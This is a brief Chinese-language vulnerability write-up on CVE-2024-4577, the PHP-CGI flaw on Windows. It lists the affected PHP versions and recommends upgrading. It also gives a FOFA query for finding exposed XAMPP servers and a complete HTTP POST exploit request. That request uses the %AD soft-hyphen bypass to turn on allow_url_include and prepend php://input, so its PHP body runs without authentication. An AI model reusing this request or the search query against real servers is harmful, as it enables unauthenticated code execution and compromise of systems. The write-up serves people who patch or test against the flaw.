# CVE-2024-4577

## 1.漏洞描述

PHP 在设计时忽略 Windows 中对字符转换的Best-Fit 特性，当PHP运行在Window平台且使用了如下语系（简体中文936/繁体中文950/日文932等）时，攻击者可构造恶意请求绕过CVE-2012-1823 保护，从而可在无需登陆的情况下执行任意PHP代码。

2024年6月6日，PHP官方发布新版本正式修复该漏洞，漏洞利用较为简单且危害较大，建议尽快采取措施升级或者进行缓解。

## 2.影响版本

​    PHP 8.3 < 8.3.8

​    PHP 8.2 < 8.2.20

​    PHP 8.1 < 8.1.29

## 3.fofa语法

```plain
header="Xampps_info" || body="/xampps.jpg" || (header="location http" && header="xampp") || body="content=\"Kai Oswald Seidler" || title="XAMPP for" || title="XAMPP Version" || body="font-size: 1.2em; color: red;\">New XAMPP"
```

## 4.漏洞复现

```plain
POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.69
Connection: close
Content-Length: 37
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

<?php echo md5("hello"); ?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719227743875-cfdbbee2-4c56-43a2-b6f5-311c40d0573d.png)